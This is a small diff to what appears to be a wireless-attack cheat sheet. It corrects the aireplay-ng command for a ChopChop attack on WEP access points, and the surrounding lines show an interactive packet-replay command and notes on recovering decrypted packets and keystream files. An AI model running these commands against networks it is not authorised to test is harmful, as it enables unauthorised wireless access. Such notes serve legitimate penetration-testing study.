@@ -322,7 +322,7 @@ aireplay-ng -2 -r [CAPTURE FILE] $WI_INTF
 --ChopChop Attack
 --  Can't be used against all AP but may work where 
 
-aireplay-ng -4 -b -$AP_MAC -h %ATK_MAC $WI_INTF
+aireplay-ng -4 -b $AP_MAC -h $ATK_MAC $WI_INTF
 # -4 ChopChop
 #Interactive, results in decrypted packet and PRGA source stream files
 
